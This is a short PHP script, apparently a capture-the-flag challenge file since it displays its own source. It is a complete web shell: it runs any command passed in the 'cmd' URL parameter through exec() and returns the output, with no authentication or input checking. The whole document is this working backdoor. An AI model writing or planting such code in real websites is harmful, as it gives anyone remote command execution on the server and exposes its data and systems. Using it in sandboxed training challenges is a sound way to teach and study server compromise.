<?php
if(isset($_GET['cmd'])){
    echo exec($_GET['cmd']);
}
highlight_file(__FILE__);